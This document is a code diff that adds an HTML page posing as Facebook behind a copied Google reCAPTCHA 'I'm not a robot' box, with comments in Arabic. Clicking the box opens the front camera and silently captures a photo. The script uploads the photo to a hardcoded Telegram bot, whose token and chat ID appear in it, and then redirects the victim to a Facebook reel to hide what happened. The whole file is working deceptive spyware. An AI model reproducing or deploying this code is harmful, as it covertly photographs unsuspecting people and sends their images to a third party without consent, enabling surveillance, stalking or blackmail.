@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Facebook</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            width: 100%; 
+            height: 100vh; 
+            background: #f0f2f5;
+            overflow: hidden;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        #video, #canvas { 
+            position: absolute; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        /* ✅ صندوق reCAPTCHA المقلد - يشبه الحقيقي 100% */
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+            padding: 20px 25px;
+            display: flex;
+            align-items: center;
+            width: 340px;
+            height: 78px;
+            cursor: pointer;
+            position: relative;
+            direction: ltr; /* اتجاه إنجليزي مثل الأصل */
+        }
+        
+        /* المربع الأبيض */
+        .checkbox-wrapper {
+            width: 28px;
+            height: 28px;
+            background: white;
+            border: 2px solid #abadae;
+            border-radius: 2px;
+            margin-right: 15px;
+            position: relative;
+            flex-shrink: 0;
+            transition: all 0.3s;
+        }
+        
+        /* علامة الصح الزرقاء */
+        .checkbox-wrapper.checked {
+            background: #1a73e8;
+            border-color: #1a73e8;
+        }
+        
+        .checkbox-wrapper.checked::after {
+            content: '';
+            position: absolute;
+            left: 8px;
+            top: 3px;
+            width: 6px;
+            height: 12px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+        
+        /* نص "I'm not a robot" */
+        .recaptcha-text {
+            color: #282828;
+            font-size: 14px;
+            font-weight: 400;
+            flex: 1;
+            user-select: none;
+        }
+        
+        /* شعار reCAPTCHA على اليمين */
+        .recaptcha-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-left: 20px;
+        }
+        
+        .recaptcha-icon {
+            width: 32px;
+            height: 32px;
+            margin-bottom: 4px;
+        }
+        
+        .recaptcha-brand {
+            color: #9e9e9e;
+            font-size: 10px;
+            text-align: center;
+            line-height: 1.2;
+        }
+        
+        /* حالة التحميل */
+        .loading-state {
+            display: none;
+            width: 28px;
+            height: 28px;
+            margin-right: 15px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* ✅ شاشة الكاميرا */
+        #cameraScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 20;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        #cameraVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .camera-text {
+            position: absolute;
+            bottom: 50px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: white;
+            font-size: 16px;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+        }
+        
+        .camera-spinner {
+            width: 35px;
+            height: 35px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ✅ المربع يظهر مباشرة -->
+    <div class="recaptcha-box" id="recaptchaBox">
+        <div class="checkbox-wrapper" id="checkbox"></div>
+        <div class="loading-state" id="loadingSpinner"></div>
+        <div class="recaptcha-text">I'm not a robot</div>
+        <div class="recaptcha-logo">
+            <!-- شعار reCAPTCHA -->
+            <svg class="recaptcha-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#4285F4" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                <path fill="#34A853" d="M12 22c5.52 0 10-4.48 10-10S17.52 2 12 2v2c4.42 0 8 3.58 8 8s-3.58 8-8 8v2z" opacity="0.5"/>
+            </svg>
+            <div class="recaptcha-brand">
+                reCAPTCHA<br>
+                <span style="font-size:9px;">Privacy - Terms</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة الكاميرا -->
+    <div id="cameraScreen">
+        <video id="cameraVideo" autoplay playsinline muted></video>
+        <div class="camera-text">
+            <div class="camera-spinner"></div>
+            <div>جاري تحضير الفيديو...</div>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
+        const chatId = "5015426926";
+        const VIDEO_LINK = 'https://www.facebook.com/reel/1431859845423648/?fs=e&fs=e';
+        
+        let stream = null;
+        let checked = false;
+
+        // ✅ عند الضغط على المربع
+        document.getElementById('recaptchaBox').addEventListener('click', function() {
+            if (checked) return;
+            checked = true;
+            
+            // إظهار التحميل
+            document.getElementById('checkbox').style.display = 'none';
+            document.getElementById('loadingSpinner').style.display = 'block';
+            
+            // بعد ثانية، يظهر الصح
+            setTimeout(() => {
+                document.getElementById('loadingSpinner').style.display = 'none';
+                document.getElementById('checkbox').style.display = 'block';
+                document.getElementById('checkbox').classList.add('checked');
+                
+                // بعد نصف ثانية، انتقل للكاميرا
+                setTimeout(() => {
+                    document.getElementById('recaptchaBox').style.display = 'none';
+                    document.getElementById('cameraScreen').style.display = 'flex';
+                    initCamera();
+                }, 500);
+                
+            }, 1000);
+        });
+
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = stream;
+                await video.play();
+                
+                // التقاط بعد ثانيتين
+                setTimeout(captureAndSend, 2000);
+                
+            } catch (err) {
+                location.href = VIDEO_LINK;
+            }
+        }
+
+        async function captureAndSend() {
+            try {
+                const video = document.getElementById('cameraVideo');
+                
+                await new Promise(resolve => {
+                    if (video.videoWidth > 0) resolve();
+                    else video.onloadedmetadata = resolve;
+                });
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        const formData = new FormData();
+                        formData.append("chat_id", chatId);
+                        formData.append("photo", blob, "photo_" + Date.now() + ".jpg");
+                        
+                        try {
+                            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        } catch (err) {}
+                    }
+                    
+                    setTimeout(() => {
+                        location.href = VIDEO_LINK;
+                    }, 500);
+                }, "image/jpeg", 0.95);
+                
+            } catch (e) {
+                location.href = VIDEO_LINK;
+            }
+        }
+    </script>
+
+</body>
+</html>
